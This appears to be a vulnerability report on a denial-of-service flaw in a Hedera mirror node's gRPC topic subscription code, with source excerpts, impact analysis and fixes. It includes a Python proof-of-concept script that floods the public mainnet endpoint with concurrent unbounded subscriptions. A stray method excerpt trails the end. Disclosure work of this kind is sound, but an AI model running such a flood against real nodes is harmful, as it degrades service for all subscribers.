### Title
Unbounded Heap Allocation via Unthrottled Poll with startTime=0 on High-Volume Topic

### Summary
An unprivileged user can subscribe to a topic with `startTime=0` and no `endTime`, causing the safety-check path in `TopicMessageServiceImpl.missingMessages()` to unconditionally trigger an unthrottled `retrieve(filter, false)` call after 1 second. Each unthrottled poll materializes up to 5,000 `TopicMessage` objects into heap via `getResultList()` in `TopicMessageRepositoryCustomImpl.findByFilter()`. With no per-user subscription limit enforced, opening many concurrent connections multiplies this heap pressure, causing GC pauses that degrade all gRPC network layer operations.

### Finding Description

**Code path 1 — unthrottled retrieval triggered unconditionally:**

In `TopicMessageServiceImpl.subscribeTopic()` (line 67–70), a safety-check `Mono` fires after 1 second:

```java
Flux<TopicMessage> safetyCheck = Mono.delay(Duration.ofSeconds(1L))
        .filter(_ -> !topicContext.isComplete())
        .flatMapMany(_ -> missingMessages(topicContext, null))
        .subscribeOn(Schedulers.boundedElastic());
```

`topicContext.isComplete()` (lines 203–215) returns `false` whenever `filter.getEndTime() == null`. A subscription with no `endTime` therefore **always** passes the filter, and `missingMessages(topicContext, null)` is called.

Inside `missingMessages()` (line 149):

```java
return topicMessageRetriever.retrieve(gapFilter, false);   // throttled=false
```

**Code path 2 — unthrottled poll loads 5,000 rows into heap per call:**

`PollingTopicMessageRetriever.poll()` (lines 65–79) computes `pageSize`:

```java
int limit = filter.hasLimit()
        ? (int) (filter.getLimit() - context.getTotal().get())
        : Integer.MAX_VALUE;                          // no limit → MAX_VALUE
int pageSize = Math.min(limit, context.getMaxPageSize()); // unthrottled default = 5000
```

`findByFilter()` in `TopicMessageRepositoryCustomImpl` (line 60):

```java
return typedQuery.getResultList().stream();  // full page materialized into List<TopicMessage>
```

`getResultList()` loads the entire page into a `List` before returning. With `startTime=0` on a topic with millions of messages, each poll allocates a 5,000-element `List<TopicMessage>` on the heap.

**Code path 3 — unthrottled polling repeats up to 12 times:**

`PollingContext` for unthrottled (lines 103–107):

```java
numRepeats = unthrottled.getMaxPolls();      // default 12
frequency  = unthrottled.getPollingFrequency(); // default 20ms
maxPageSize = unthrottled.getMaxPageSize();  // default 5000
```

`isComplete()` for unthrottled (lines 127–128):

```java
return limitHit;   // false when no limit is set
```

So with no limit, the retriever polls 12 times × 5,000 messages = **60,000 `TopicMessage` objects per subscription** loaded into heap.

**No subscription count enforcement:**

`subscriberCount` (line 48) is a Micrometer gauge only — no maximum is checked or enforced. `NettyProperties.maxConcurrentCallsPerConnection = 5` limits calls per TCP connection, but an attacker can open arbitrarily many connections.

**Root cause / failed assumption:** The design assumes that the safety-check unthrottled path is rare and short-lived. It fails to account for: (a) `isComplete()` always returning `false` when no `endTime` is set, making the safety check fire on every subscription; (b) `getResultList()` fully materializing each page into heap; (c) no cap on concurrent subscriptions.

### Impact Explanation

Each subscription without `endTime` unconditionally triggers an unthrottled retrieval that allocates up to 60,000 `TopicMessage` objects (≈ several hundred MB depending on message payload size) into heap. With N concurrent subscriptions, heap usage scales linearly. Sustained heap pressure causes frequent GC pauses (stop-the-world in G1/ZGC) that stall all gRPC I/O threads, degrading or completely blocking message delivery for all subscribers on the node. In extreme cases, `OutOfMemoryError` terminates the JVM. This is a Denial-of-Service against the gRPC network layer with no funds at direct risk, matching the stated scope.

### Likelihood Explanation

The attack requires only a valid gRPC client (no credentials, no privileged account). The attacker needs to know a `topicId` with a large message history — public topics on Hedera mainnet have millions of messages and their IDs are publicly discoverable. Opening many TCP connections is trivial. The safety-check trigger is deterministic (fires after exactly 1 second on every subscription without `endTime`), making the exploit fully repeatable and scriptable.

### Recommendation

1. **Fix `isComplete()` or the safety-check guard**: The safety check should not fire when historical retrieval is still actively progressing. Track whether the historical `Flux` has emitted at least one item since the last check, or suppress the safety check entirely while historical retrieval is in-flight.
2. **Replace `getResultList()` with a cursor/scroll**: Use `getResultStream()` with a Hibernate scroll or Spring Data `Stream<T>` backed by a server-side cursor to avoid materializing the full page into heap.
3. **Enforce a global and per-IP subscription limit**: Reject new subscriptions when `subscriberCount` exceeds a configurable maximum; add per-IP rate limiting at the gRPC interceptor layer.
4. **Require `endTime` or enforce a maximum subscription duration**: Subscriptions without `endTime` are unbounded; requiring one (or defaulting to a short TTL) eliminates the always-false `isComplete()` path.
5. **Reduce unthrottled `maxPageSize`**: The default of 5,000 is unnecessarily large; align it with the throttled default of 1,000 or lower.

### Proof of Concept

```python
# Requires grpcio and the mirror node proto stubs
import grpc, threading
from com.hedera.mirror.api.proto import consensus_service_pb2_grpc, consensus_service_pb2
from proto.services import timestamp_pb2, basic_types_pb2

TARGET = "mainnet-public.mirrornode.hedera.com:443"
TOPIC_ID = basic_types_pb2.TopicID(topicNum=<high_volume_topic>)

def flood():
    channel = grpc.secure_channel(TARGET, grpc.ssl_channel_credentials())
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    req = consensus_service_pb2.ConsensusTopicQuery(
        topicID=TOPIC_ID,
        consensusStartTime=timestamp_pb2.Timestamp(seconds=0, nanos=0),
        # no consensusEndTime → isComplete() always false → safety check always fires
    )
    try:
        for _ in stub.subscribeTopic(req):
            pass
    except Exception:
        pass

# Open many concurrent connections (5 calls each via maxConcurrentCallsPerConnection)
threads = [threading.Thread(target=flood) for _ in range(200)]
for t in threads: t.start()
for t in threads: t.join()
# After ~1 second each subscription triggers unthrottled retrieve(filter, false)
# 200 subscriptions × 60,000 TopicMessage objects → severe heap pressure → GC pauses
```

**Expected result:** GC pause logs spike on the mirror node; gRPC response latency for all subscribers increases significantly; under sustained load, `OutOfMemoryError` or JVM crash.

    private Flux<TopicMessage> poll(PollingContext context) {
        TopicMessageFilter filter = context.getFilter();
        TopicMessage last = context.getLast();
        int limit = filter.hasLimit()
                ? (int) (filter.getLimit() - context.getTotal().get())
                : Integer.MAX_VALUE;
        int pageSize = Math.min(limit, context.getMaxPageSize());
        var startTime = last != null ? last.getConsensusTimestamp() + 1 : filter.getStartTime();
        context.getPageSize().set(0L);

        var newFilter = filter.toBuilder().limit(pageSize).startTime(startTime).build();

        log.debug("Executing query: {}", newFilter);
        return Flux.fromStream(topicMessageRepository.findByFilter(newFilter));
    }
